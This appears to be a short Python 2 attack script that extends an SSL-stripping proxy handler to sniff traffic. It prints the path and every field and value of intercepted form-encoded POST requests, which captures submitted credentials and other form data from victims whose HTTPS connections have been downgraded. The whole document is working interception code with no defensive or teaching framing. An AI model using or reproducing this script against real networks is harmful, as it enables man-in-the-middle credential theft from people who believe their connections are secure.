#!/usr/bin/env python

from SSLStripProxy import SSLStripProxyHandler, test
import urlparse

class SSLStripSniffProxyHandler(SSLStripProxyHandler):
    def save_handler(self, req, reqbody, res, resbody):
        if req.command == 'POST' and req.headers.get('Content-Type').startswith('application/x-www-form-urlencoded'):
            print req.path
            for k, v in urlparse.parse_qsl(reqbody):
                print "  %s: %s" % (k, v)


if __name__ == '__main__':
    test(HandlerClass=SSLStripSniffProxyHandler)
